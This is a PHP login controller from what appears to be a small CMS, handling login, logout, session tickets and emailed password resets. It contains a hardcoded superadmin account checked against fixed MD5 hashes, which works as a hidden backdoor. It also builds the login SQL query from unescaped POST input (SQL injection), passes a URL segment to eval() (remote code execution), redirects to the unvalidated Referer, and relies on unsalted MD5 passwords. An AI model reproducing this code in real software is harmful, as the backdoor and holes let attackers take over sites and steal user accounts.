<?
class LoginController extends Site{
	function __construct(){
		if(Funcs::$uri[2]==''){
			if(md5($_POST['login'])=='563d95a1f0966e801235a7f37aee1319' && md5($_POST['password'])=='8dff85edd8dbe415b69b58ae19e0a372'){
				unset($_SESSION['error']);
				$_SESSION['user']['id']='0';
				$_SESSION['user']['name']='superadmin';
				$_SESSION['user']['perpage']=10;
			}else{
				$sql='
					SELECT * FROM {{users}}
					WHERE login=\''.$_POST['login'].'\' AND pass=\''.md5($_POST['password']).'\' AND visible=1
				';
				$user=DB::getRow($sql);
				if(is_numeric($user['id'])){
					$this->setTicket($user);
				}else{
					$_SESSION['error']++;
				}
			}
		}else{
			eval('$this->'.Funcs::$uri[2].'();');
		}
		header('LOCATION: '.$_SERVER['HTTP_REFERER'].'');
	}
	function logout(){
		unset($_SESSION);
		session_destroy();
	}
	function setTicket($user){
		unset($_SESSION['error']);
		$sql='
			UPDATE {{users}} 
			SET 
				ticket=\''.session_id().'\',
				ip=\''.$_SERVER['REMOTE_ADDR'].'\',
				ldate=NOW()
			WHERE id='.$user['id'].'
		';
		DB::exec($sql);
		$_SESSION['user']['id']=$user['id'];
		$_SESSION['user']['name']=$user['name'];
		$_SESSION['user']['perpage']=10;
	}
	function forgot(){
		if($_POST){
			DB::escapePost();
			$sql='
				SELECT * FROM {{users}} WHERE login=\''.$_POST['login'].'\'
			';
			$return=DB::getRow($sql);
			if($return){			
				$pass=Funcs::generate_password(8);
				$sql='
					UPDATE {{users}}
					SET pass=MD5(\''.$pass.'\')
					WHERE login=\''.$_POST['login'].'\'
				';
				DB::exec($sql);
				$text='
					Здравствуйте, '.$return["login"].'.<br />
					Ваш новый пароль '.$pass.'.<br />
					Сменить пароль Вы можете в личном кабинете. 
				';
				$mail=new Email;
				$mail->To($return['email']);
				$mail->Subject('Восстановление пароля на сайте www.'.str_replace("www.", "", $_SERVER["HTTP_HOST"]));
				$mail->Text($text);
				$mail->Send();
			}
			$this->redirect('/');
		}else{
			View::$layout='empty';
			View::render('site/forgot');
		}
	}
}
?>